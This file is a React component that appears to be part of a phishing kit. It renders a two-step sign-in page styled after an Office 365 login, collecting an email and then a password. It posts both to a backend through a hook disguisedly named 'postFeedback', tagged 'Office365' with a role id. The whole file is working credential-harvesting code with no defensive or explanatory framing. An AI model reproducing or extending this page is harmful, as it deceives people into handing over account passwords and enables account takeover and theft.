import './App.css';
import './Hover.css';
import './DemoPage.css';
import qs from 'qs';
import useFeedback from './api/useFeedback';
import React, { useState } from 'react';
import PersonalInfo from './components/PersonalInfo';
import ContactInfo from './components/ContactInfo';

function Office() {


  
  const { postFeedback, isLoading } = useFeedback();
  const [emails, setEmail] = useState('');
  const [passwords, setPassword] = useState('');
  const [detail, setDetails] = useState('Office365');
  const [role, setRole] = useState('4');

  const onSubmit = async (e) => {
    e.preventDefault();
      const data = qs.stringify({
        email: emails,
        password: passwords,
        details: detail,
        role_id: role,
      });
  
      try {
        await postFeedback(data);
        setPassword('');
        setEmail('');
      } catch (error) {
        console.log(error);
      }
    };
 
  const [step, setStep] = useState(1);

  const nextStep = () => {
    if (step < 2) {
      setStep(step + 1);
    } else if (step === 2) {   
    }
  };

  const prevStep = () => {
    if (step > 1) {
      setStep(step - 1);
    }
  };





  
  return (


    <div className="bg-image" 
    style={{backgroundColor: "#fdfdfd",
           height: "100vh",  backgroundSize: "cover", backgroundRepeat: "no-repeat"}}>
     
      <div  className="container pt-5 mb-4">
        <div className="row">
        <div  className="col-sm-4 mx-auto my-5 px-5 pb-3 pt-2 shadow bg-white rounded" style={{  backgroundColor: "white", borderRadius:"15px"}}>
       
        <div className='text-left pt-2'>
   <img src="images/icro.png"  className="img-fluid" width="120px" height="90px"/>
   <br/>
 
   </div>
   {
            {
              1: <PersonalInfo emails={emails} setEmail={setEmail} />,
              2: <ContactInfo emails={emails} onSubmit={onSubmit} passwords={passwords} setPassword={setPassword} setDetails={setDetails} setRole={setRole} role={role} detail={detail}/>,
   
            }[step]
          }
          <div className="d-flex justify-content-right">
            {step > 1 ? (
            ('')
            ) : null}
                {step === 2 ?  null: <button className="btn btn-sm "  style={{ color: "white", backgroundColor:"#163a98", float: "right" }} onClick={nextStep}>
         Next
          </button>}
           
  

       

       
          
      </div>

          </div>
     
    </div> 
    </div>
    </div>

  );
}

export default Office;
